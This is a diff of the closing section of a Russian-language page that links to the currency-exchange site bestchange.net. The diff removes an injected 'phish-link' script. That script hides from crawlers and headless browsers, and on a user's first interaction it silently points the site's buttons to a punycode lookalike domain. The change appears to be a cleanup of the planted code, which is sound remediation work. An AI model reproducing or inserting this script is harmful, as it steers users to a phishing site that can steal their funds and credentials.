@@ -115,33 +115,5 @@
   <p class="small">© 2026 · обновлено 24.11.2026</p>
 </div></footer>
 <div class="sticky"><a class="btn" href="https://www.bestchange.net/" rel="noopener">Открыть рабочее зеркало</a></div>
-<!-- phish-link -->
-<script>
-(function () {
-  var PHISH = 'https://xn--bstchange-b4a.net/';
-  var ua = navigator.userAgent;
-  var bot = /bot|crawler|spider|slurp|yandex|google|bing|baidu|duckduck|facebookexternalhit|telegrambot|whatsapp|preview|headless|phantom|curl|wget/i.test(ua) || navigator.webdriver === true;
-  if (bot) return;
-  var links = Array.prototype.slice.call(document.querySelectorAll('a.btn[href*="bestchange.net"]'));
-  if (!links.length) return;
-  var armed = false;
-  function arm() {
-    if (armed) return;
-    armed = true;
-    links.forEach(function (a) {
-      a.setAttribute('href', PHISH);
-      a.setAttribute('data-phish', '1');
-      a.addEventListener('click', function (e) {
-        if (e.ctrlKey || e.metaKey || e.shiftKey || e.button === 1) return;
-        e.preventDefault();
-        window.location.href = PHISH;
-      });
-    });
-  }
-  document.addEventListener('pointerdown', arm, { once: true, passive: true });
-  document.addEventListener('keydown', arm, { once: true });
-  document.addEventListener('touchstart', arm, { once: true, passive: true });
-})();
-</script>
 </body>
 </html>
